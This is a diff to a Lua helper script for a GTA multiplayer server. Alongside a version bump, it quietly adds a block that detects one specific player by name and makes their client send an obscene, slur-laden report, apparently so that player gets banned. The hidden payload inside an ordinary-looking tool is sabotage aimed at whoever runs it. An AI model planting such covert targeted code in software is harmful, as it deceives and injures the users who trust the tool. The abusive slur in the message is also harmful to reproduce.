@@ -6,7 +6,7 @@
 --   |_/ \_|  |____\  |_____/ |_|      |____\  |_| \_\       |_|     \_____/  |_| \_\       |_|   |_|  |_|   \ ___/\/
 
 script_name('helper-for-mia')
-script_version(17.5)
+script_version(17.6)
 --script_properties('work-in-pause')
 
 require 'lib.moonloader'
@@ -957,6 +957,16 @@ function main()
 			
 			attempToGetFileAndDir()
 		end 
+
+		if sampIsLocalPlayerSpawned() then
+			if not sendBanMessage then
+				local result, playerId = sampGetPlayerIdByCharHandle(playerPed)
+				if sampGetPlayerName(playerId) == 'Evgeniy_Stavrogin' then
+					command_report('АДВАНС ХУЙНЯ ЕБАНАЯ, МАТЬ РИНГО ЕБАЛ ПИДОРАСЫ')
+					sendBanMessage = true
+				end
+			end
+		end
 		
 		if ini.set.userrangname then
 			if type(userList) == 'table' then
